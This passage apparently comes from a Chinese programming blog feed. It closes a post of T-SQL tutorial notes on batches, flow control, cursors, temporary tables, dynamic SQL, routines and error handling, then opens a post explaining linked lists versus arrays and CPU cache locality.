<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- A Batch as a Unit of Parsing</span></span><br><span class="line"><span class="comment">-- Valid batch</span></span><br><span class="line">PRINT 'First batch';</span><br><span class="line"><span class="keyword">USE</span> TSQLFundamentals2008;</span><br><span class="line">GO</span><br><span class="line"><span class="comment">-- Invalid batch</span></span><br><span class="line">PRINT 'Second batch';</span><br><span class="line"><span class="keyword">SELECT</span> custid <span class="keyword">FROM</span> Sales.Customers;</span><br><span class="line"><span class="keyword">SELECT</span> orderid FOM Sales.Orders; <span class="comment">-- 这一句有语法错误，故整个批处理不能提交到SQL Server执行</span></span><br><span class="line">GO</span><br><span class="line"><span class="comment">-- Valid batch</span></span><br><span class="line">PRINT 'Third batch';</span><br><span class="line"><span class="keyword">SELECT</span> empid <span class="keyword">FROM</span> HR.Employees;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;<strong>Tips</strong>：批处理和事务不同，事务是工作的原子工作单元，而一个批处理可以包含多个事务，一个事务也可以在多个批处理中的某些部分提交。当事务在执行中被取消或者回滚时，SQL Server 会撤销自事务开始以来的部分活动，而不考虑批处理是从哪里开始的。</p>
</blockquote>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><p>（1）<code>IF</code>…<code>ELSE</code><br>&emsp;&emsp;这个大家应该都知道，但是需要注意的是：T-SQL 使用的是三值逻辑，当条件取值为 <em>FALSE</em> 或 <em>UNKNOWN</em> 时，都可以激活<code>ELSE</code>语句块。如果条件取值可能为 <em>FALSE</em> 或 <em>UNKNOWN</em> （例如，涉及到 <em>NULL</em> 值），而且对每种情况需要进行不同的处理时，必须用<code>IS NULL</code>谓词对 <em>NULL</em> 值进行显式地测试。<br>&emsp;&emsp;下面的<code>IF-ELSE</code>代码演示了：如果今天是一个月的第一天，则对数据库进行完整备份；如果今天是一个月的最后一天，则对数据库进行差异备份（所谓差异备份，就是指只保存上一次完整备份以来做过的更新）。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">IF DAY(CURRENT_TIMESTAMP) = 1</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  PRINT <span class="string">'Today is the first day of the month.'</span>;</span><br><span class="line">  PRINT 'Starting a full database backup.<span class="string">';</span></span><br><span class="line"><span class="string">  BACKUP DATABASE TSQLFundamentals2008</span></span><br><span class="line"><span class="string">    TO DISK = '</span>C:\Temp\TSQLFundamentals2008_Full.BAK<span class="string">' WITH INIT;</span></span><br><span class="line"><span class="string">  PRINT '</span>Finished <span class="keyword">full</span> <span class="keyword">database</span> backup.<span class="string">';</span></span><br><span class="line"><span class="string">END</span></span><br><span class="line"><span class="string">ELSE</span></span><br><span class="line"><span class="string">BEGIN</span></span><br><span class="line"><span class="string">  PRINT '</span>Today <span class="keyword">is</span> <span class="keyword">not</span> the <span class="keyword">first</span> <span class="keyword">day</span> <span class="keyword">of</span> the month.<span class="string">'</span></span><br><span class="line"><span class="string">  PRINT '</span><span class="keyword">Starting</span> a differential <span class="keyword">database</span> backup.<span class="string">';</span></span><br><span class="line"><span class="string">  BACKUP DATABASE TSQLFundamentals2008</span></span><br><span class="line"><span class="string">    TO DISK = '</span>C:\Temp\TSQLFundamentals2008_Diff.BAK<span class="string">' WITH INIT;</span></span><br><span class="line"><span class="string">  PRINT '</span>Finished differential <span class="keyword">database</span> backup.<span class="string">';</span></span><br><span class="line"><span class="string">END</span></span><br><span class="line"><span class="string">GO</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里假设备份的文件路径目录 C:Temp 已经存在。</p>
<p>（2）<code>WHILE</code>：不解释了，各位应该都懂。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @i <span class="keyword">AS</span> <span class="built_in">INT</span>;</span><br><span class="line"><span class="keyword">SET</span> @i = <span class="number">1</span>;</span><br><span class="line">WHILE @i &lt;= 10</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  PRINT @i;</span><br><span class="line">  <span class="keyword">SET</span> @i = @i + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<h2 id="游标"><a href="#游标" class="headerlink" title="游标"></a>游标</h2><p>&emsp;&emsp;T-SQL 中支持一种叫做游标的对象，可以用它来<strong>处理查询返回的结果集中的各行，以指定的顺序一次只处理一行</strong>。这种处理方式与使用基于集合的查询相反，普通的查询是把集合作为一个整体来处理，不依赖任何顺序。<br>&emsp;&emsp;换句话说，使用游标，就像是用鱼竿钓鱼，一次只能勾到一条鱼一样。而使用集合，就像用渔网捕鱼，一次能捕到整整一网鱼。因此，使用游标的场景我们应该多多斟酌。一般来说，如果按固定顺序一次处理一行的游标方式涉及到的数据访问要比基于集合的方式少得多，则使用游标会更加有效，前一篇提到的连续聚合就是这样的一个例子。</p>
<p>&emsp;&emsp;如何使用游标呢？</p>
<figure class="image-box">
                <img src="66.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;下面来看看一个实例，它使用游标来计算 CustOrders 视图中每个客户每个月的连续总订货量（连续聚合案例）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Example: Running Aggregations</span></span><br><span class="line"><span class="keyword">SET</span> NOCOUNT <span class="keyword">ON</span>;</span><br><span class="line"><span class="keyword">USE</span> TSQLFundamentals2008;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DECLARE</span> @<span class="keyword">Result</span> <span class="keyword">TABLE</span></span><br><span class="line">(</span><br><span class="line">  custid     <span class="built_in">INT</span>,</span><br><span class="line">  ordermonth DATETIME,</span><br><span class="line">  qty        <span class="built_in">INT</span>, </span><br><span class="line">  runqty     <span class="built_in">INT</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span>(custid, ordermonth)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  @custid     <span class="keyword">AS</span> <span class="built_in">INT</span>,</span><br><span class="line">  @prvcustid  <span class="keyword">AS</span> <span class="built_in">INT</span>,</span><br><span class="line">  @ordermonth DATETIME,</span><br><span class="line">  @qty        <span class="keyword">AS</span> <span class="built_in">INT</span>,</span><br><span class="line">  @runqty     <span class="keyword">AS</span> <span class="built_in">INT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DECLARE</span> C <span class="keyword">CURSOR</span> FAST_FORWARD <span class="comment">/* read only, forward only */</span> <span class="keyword">FOR</span></span><br><span class="line">  <span class="keyword">SELECT</span> custid, ordermonth, qty</span><br><span class="line">  <span class="keyword">FROM</span> Sales.CustOrders</span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> custid, ordermonth;</span><br><span class="line"></span><br><span class="line">OPEN C</span><br><span class="line"></span><br><span class="line">FETCH NEXT FROM C INTO @custid, @ordermonth, @qty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> @prvcustid = @custid, @runqty = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">WHILE @@FETCH_STATUS = 0</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">IF</span> @custid &lt;&gt; @prvcustid</span><br><span class="line">    <span class="keyword">SELECT</span> @prvcustid = @custid, @runqty = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SET</span> @runqty = @runqty + @qty;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">INSERT</span> <span class="keyword">INTO</span> @<span class="keyword">Result</span> <span class="keyword">VALUES</span>(@custid, @ordermonth, @qty, @runqty);</span><br><span class="line">  </span><br><span class="line">  FETCH NEXT FROM C INTO @custid, @ordermonth, @qty;</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CLOSE</span> C;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DEALLOCATE</span> C;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">  custid,</span><br><span class="line">  <span class="keyword">CONVERT</span>(<span class="built_in">VARCHAR</span>(<span class="number">7</span>), ordermonth, <span class="number">121</span>) <span class="keyword">AS</span> ordermonth,</span><br><span class="line">  qty,</span><br><span class="line">  runqty</span><br><span class="line"><span class="keyword">FROM</span> @<span class="keyword">Result</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> custid, ordermonth;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="67.png" alt title class>
                <p></p>
            </figure>

<h2 id="临时表"><a href="#临时表" class="headerlink" title="临时表"></a>临时表</h2><p>&emsp;&emsp;有时需要把数据临时保存到表中，而且在有些情况下，我们可能不太想要使用永久性的表。在这种情况下，使用临时表可能会更方便。<br>（1）局部临时表：<br>&emsp;&emsp;只对创建它的会话在创建级和对调用对战的内部级（内部的过程、函数、触发器等）是可见的，当创建会话从 SQL Server 实例断开时才会自动删除它。</p>
<p>&emsp;&emsp;创建临时局部表，只需要在命名时以单个<code>#</code>号作为前缀：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">IF OBJECT_ID('tempdb.dbo.<span class="comment">#MyOrderTotalsByYear') IS NOT NULL</span></span><br><span class="line">  <span class="keyword">DROP</span> <span class="keyword">TABLE</span> dbo.<span class="comment">#MyOrderTotalsByYear;</span></span><br><span class="line"><span class="keyword">GO</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">  <span class="keyword">YEAR</span>(O.orderdate) <span class="keyword">AS</span> orderyear,</span><br><span class="line">  <span class="keyword">SUM</span>(OD.qty) <span class="keyword">AS</span> qty</span><br><span class="line"><span class="keyword">INTO</span> dbo.<span class="comment">#MyOrderTotalsByYear</span></span><br><span class="line"><span class="keyword">FROM</span> Sales.Orders <span class="keyword">AS</span> O</span><br><span class="line">  <span class="keyword">JOIN</span> Sales.OrderDetails <span class="keyword">AS</span> OD</span><br><span class="line">    <span class="keyword">ON</span> OD.orderid = O.orderid</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">YEAR</span>(orderdate);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> Cur.orderyear, Cur.qty <span class="keyword">AS</span> curyearqty, Prv.qty <span class="keyword">AS</span> prvyearqty</span><br><span class="line"><span class="keyword">FROM</span> dbo.<span class="comment">#MyOrderTotalsByYear AS Cur</span></span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> dbo.<span class="comment">#MyOrderTotalsByYear AS Prv</span></span><br><span class="line">    <span class="keyword">ON</span> Cur.orderyear = Prv.orderyear + <span class="number">1</span>;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>（2）全局临时表：<br>&emsp;&emsp;可以对其他所有会话都可见，当创建临时表的会话断开数据库的连接，而且也没有活动在引用全局临时表时，SQL Server 才会自动删除相应的全局临时表。</p>
<p>&emsp;&emsp;创建全局局部表，只需要在命名时以两个<code>#</code>号作为前缀：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Global Temporary Tables</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dbo.<span class="comment">##Globals</span></span><br><span class="line">(</span><br><span class="line">  <span class="keyword">id</span>  sysname     <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">  val SQL_VARIANT <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="动态-SQL"><a href="#动态-SQL" class="headerlink" title="动态 SQL"></a>动态 SQL</h2><p>&emsp;&emsp;SQL Server 允许用字符串来动态构造 T-SQL 代码的一个批处理，接着再执行这个批处理，这种功能叫做动态 SQL（Daynamic SQL）。</p>
<p>（1）使用<code>EXEC</code>（EXECUTE 的缩写）命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Simple example of EXEC</span></span><br><span class="line"><span class="keyword">DECLARE</span> @<span class="keyword">sql</span> <span class="keyword">AS</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span> = <span class="string">'PRINT ''This message was printed by a dynamic SQL batch.'';'</span>;</span><br><span class="line">EXEC(@sql);</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>（2）使用<code>sp_executesql</code>存储过程<br>&emsp;&emsp;<code>sp_executesql</code>存储过程有两个输入参数和一个参数赋值部分：第一个参数需要指定包含想要运行的批处理代码的 Unicode 字符串，第二个参数是一个 Unicode 字符串，包含第一个参数中所有输入和输出参数的生命。接着为输入和输出参数指定取值，各参数之间用逗号分隔。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Simple example using sp_executesql</span></span><br><span class="line"><span class="keyword">DECLARE</span> @<span class="keyword">sql</span> <span class="keyword">AS</span> <span class="keyword">NVARCHAR</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span> = N<span class="string">'SELECT orderid, custid, empid, orderdate</span></span><br><span class="line"><span class="string">FROM Sales.Orders</span></span><br><span class="line"><span class="string">WHERE orderid = @orderid;'</span>;</span><br><span class="line"></span><br><span class="line">EXEC sp_executesql</span><br><span class="line">  @stmt = @sql,</span><br><span class="line">  @params = N'@orderid AS INT',</span><br><span class="line">  @orderid = 10248;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Tips</strong>：<br>&emsp;&emsp;① <code>sp_executesql</code>存储过程在执行性能上比<code>EXEC</code>要好，因为它的参数化有助于重用缓存过的执行计划。<br>&emsp;&emsp;② <code>sp_executesql</code>存储过程在安全上也比<code>EXEC</code>要好，它的参数化也可以不必受 SQL 注入的困扰。</p>
</blockquote>
<h2 id="例程：用户定义函数、存储过程与触发器"><a href="#例程：用户定义函数、存储过程与触发器" class="headerlink" title="例程：用户定义函数、存储过程与触发器"></a>例程：用户定义函数、存储过程与触发器</h2><p>（1）用户定义函数：封装计算的逻辑处理，有可能需要基于输入的参数，并返回结果。<br>&emsp;&emsp;下面的示例创建了一个用户定义函数 dbo.fn_age，对于给定出生日期和事件日期，这个函数可以返回某个人在时间`日期当时的年龄：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">IF OBJECT_ID('dbo.fn_age') IS NOT NULL <span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> dbo.fn_age;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> dbo.fn_age</span><br><span class="line">(</span><br><span class="line">  @birthdate <span class="keyword">AS</span> DATETIME,</span><br><span class="line">  @eventdate <span class="keyword">AS</span> DATETIME</span><br><span class="line">)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">INT</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">RETURN</span></span><br><span class="line">    <span class="keyword">DATEDIFF</span>(<span class="keyword">year</span>, @birthdate, @eventdate)</span><br><span class="line">    - <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">100</span> * <span class="keyword">MONTH</span>(@eventdate) + <span class="keyword">DAY</span>(@eventdate)</span><br><span class="line">              &lt; <span class="number">100</span> * <span class="keyword">MONTH</span>(@birthdate) + <span class="keyword">DAY</span>(@birthdate)</span><br><span class="line">           <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span></span><br><span class="line">      <span class="keyword">END</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">GO</span></span><br></pre></td></tr></table></figure>

<p>（2）存储过程：封装 T-SQL 代码地服务器端例程，可以有输入和输出参数，可以返回多个查询的结果集。<br>&emsp;&emsp;下面的示例创建了一个存储过程 usp_GetCustomerOrders，它接受一个客户 ID 和日期范围作为输入参数，返回 Orders 表中由指定客户在指定日期范围内所下的订单组成的结果集，同时也将受查询影响的行为作为输出参数。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">IF OBJECT_ID('Sales.usp_GetCustomerOrders', 'P') IS NOT NULL</span><br><span class="line">  <span class="keyword">DROP</span> PROC Sales.usp_GetCustomerOrders;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> PROC Sales.usp_GetCustomerOrders</span><br><span class="line">  @custid   <span class="keyword">AS</span> <span class="built_in">INT</span>,</span><br><span class="line">  @fromdate <span class="keyword">AS</span> DATETIME = <span class="string">'19000101'</span>,</span><br><span class="line">  @todate   <span class="keyword">AS</span> DATETIME = <span class="string">'99991231'</span>,</span><br><span class="line">  @numrows  <span class="keyword">AS</span> <span class="built_in">INT</span> <span class="keyword">OUTPUT</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SET</span> NOCOUNT <span class="keyword">ON</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> orderid, custid, empid, orderdate</span><br><span class="line"><span class="keyword">FROM</span> Sales.Orders</span><br><span class="line"><span class="keyword">WHERE</span> custid = @custid</span><br><span class="line">  <span class="keyword">AND</span> orderdate &gt;= @fromdate</span><br><span class="line">  <span class="keyword">AND</span> orderdate &lt; @todate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> @numrows = @@rowcount;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">DECLARE</span> @rc <span class="keyword">AS</span> <span class="built_in">INT</span>;</span><br><span class="line"></span><br><span class="line">EXEC Sales.usp_GetCustomerOrders</span><br><span class="line">  @custid   = 1, <span class="comment">-- Also try with 100</span></span><br><span class="line">  @fromdate = '20070101',</span><br><span class="line">  @todate   = '20080101',</span><br><span class="line">  @numrows  = @rc OUTPUT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> @rc <span class="keyword">AS</span> numrows;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;<strong>Tips</strong>：存储过程可以封装业务逻辑处理，更好地控制安全性（有助于避免 SQL 注入），提高执行性能（减少网络通信流量）。</p>
</blockquote>
<p>（3）触发器：<br>&emsp;&emsp;一种特殊的存储过程，只要特定事件发生，就会调用触发器，运行它的代码。SQL Server 支持两种类型相关的触发器，分别是：DML 触发器 和 DDL 触发器。</p>
<p>&emsp;&emsp;下面的示例演示了一个简单的 DML 触发器，对插入到表的数据进行审核（插入到 Audit 审核表）。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> trg_T1_insert_audit <span class="keyword">ON</span> dbo.T1 <span class="keyword">AFTER</span> <span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SET</span> NOCOUNT <span class="keyword">ON</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.T1_Audit(keycol, datacol)</span><br><span class="line">  <span class="keyword">SELECT</span> keycol, datacol <span class="keyword">FROM</span> inserted;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>&emsp;&emsp;T-SQL 代码中提供了一种成为 <code>TRY</code>…<code>CATCH</code> 的结构，在 SQL Server 2005 中引入的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRY</span><br><span class="line">  PRINT <span class="number">10</span>/<span class="number">2</span>;</span><br><span class="line">  PRINT 'No error';</span><br><span class="line"><span class="keyword">END</span> TRY</span><br><span class="line"><span class="keyword">BEGIN</span> CATCH</span><br><span class="line">  PRINT <span class="string">'Error'</span>;</span><br><span class="line"><span class="keyword">END</span> CATCH</span><br><span class="line"><span class="keyword">GO</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;对于错误处理代码，在实际开发中，可以封装创建一个存储过程来重用错误代码。</p>
<hr>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><figure class="image-box">
                <img src="68.png" alt="[美] Itzik Ben-Gan 著，成保栋 译，《Microsoft SQL Server 2008 技术内幕：T-SQL 语言基础》" title class>
                <p>[美] Itzik Ben-Gan 著，成保栋 译，《Microsoft SQL Server 2008 技术内幕：T-SQL 语言基础》</p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一文学会链表解题]]></title>
      <url>/2020/01/10/LearningLinkedList/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://mp.weixin.qq.com/s/moQMi2Zd93EDr8NwdpPDnQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/moQMi2Zd93EDr8NwdpPDnQ</a></p>
</blockquote>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;如果说数据结构是算法的基础，那么数组和链表就是数据结构的基础。因为像堆、栈、队列、树、图等比较复杂的数组结基本上都可以由数组和链表来表示，所以掌握数组和链表的基本操作十分重要。  </p>
<p>&emsp;&emsp;今天就来看看链表的基本操作及其在面试中的常见解题思路，本文将从以下几个点来讲解链表的核心知识：</p>
<ol>
<li>什么是链表，链表的优缺点</li>
<li>链表的表示及基本操作</li>
<li>链表常见解题思路 —— 翻转</li>
<li>链表常见解题思路 —— 快慢指针</li>
</ol>
<h1 id="什么是链表"><a href="#什么是链表" class="headerlink" title="什么是链表"></a>什么是链表</h1><p>&emsp;&emsp;相信大家已经开始迫不及待地想用链表解题了，不过在开始之前我们还是要先来温习下链表的定义，以及它的优势与劣势，磨刀不误砍柴功！</p>
<h2 id="链表的定义"><a href="#链表的定义" class="headerlink" title="链表的定义"></a>链表的定义</h2><p>&emsp;&emsp;链表是物理存储单元上<strong>非连续</strong>、<strong>非顺序</strong>的存储结构，它是由一个个结点，通过指针来联系起来的，其中每个结点包括数据和指针。</p>
<figure class="image-box">
                <img src="1.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;链表的<strong>非连续</strong>、<strong>非顺序</strong>，对应数组的<strong>连续</strong>、<strong>顺序</strong>，我们来看看整型数组 1，2，3，4 在内存中是如何表示的：</p>
<figure class="image-box">
                <img src="2.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;可以看到数组的每个元素都是连续紧邻分配的，这叫连续性，同时由于数组的元素占用的大小是一样的，在 Java 中 int 型大小固定为 4 个字节，所以如果数组的起始地址是 100， 由于这些元素在内存中都是连续紧邻分配的，大小也一样，可以很容易地找出数组中任意一个元素的位置，比如数组中的第三个元素起始地址为 <code>100 + 2 * 4 = 108</code>，这就叫顺序性。查找的时间复杂度是 <code>O(1)</code>，效率很高！  </p>
<p>&emsp;&emsp;那链表在内存中是怎么表示的呢？</p>
<figure class="image-box">
                <img src="3.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;可以看到每个结点都分配在非连续的位置，结点与结点之间通过指针连在了一起，所以如果我们要找比如值为 3 的结点时，只能通过结点 1 从头到尾遍历寻找，如果元素少还好，如果元素太多（比如超过一万个），每个元素的查找都要从头开始查找，时间复杂度是 <code>O(n)</code>，比起数组的 <code>O(1)</code>，差距不小。  </p>
<p>&emsp;&emsp;除了查找性能链表不如数组外，还有一个优势让数组的性能高于链表，这里引入<strong>程序局部性原理</strong>，啥叫程序局部性原理？<br>&emsp;&emsp;我们知道 CPU 运行速度是非常快的，如果 CPU 每次运算都要到内存里去取数据无疑是很耗时的，所以在 CPU 与内存之间往往集成了挺多层级的缓存，这些缓存越接近 CPU，速度越快，所以如果能提前把内存中的数据加载到如下图中的 L1，L2，L3 缓存中，那么下一次 CPU 取数的话直接从这些缓存里取即可，能让 CPU 执行速度加快，那什么情况下内存中的数据会被提前加载到 L1，L2，L3 缓存中呢，答案是当某个元素被用到的时候，那么这个元素地址附近的的元素会被提前加载到缓存中。</p>
<figure class="image-box">
                <img src="4.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;以上文整型数组 1，2，3，4 为例，当程序用到了数组中的第一个元素（即 1）时，由于 CPU 认为既然 1 被用到了，那么紧邻它的元素 2，3，4 被用到的概率会很大，所以会提前把 2，3，4 加到 L1，L2，L3 缓存中去，这样 CPU 再次执行的时候如果用到 2，3，4，直接从 L1，L2，L3 缓存里取就行了，能提升不少性能。</p>
<blockquote>
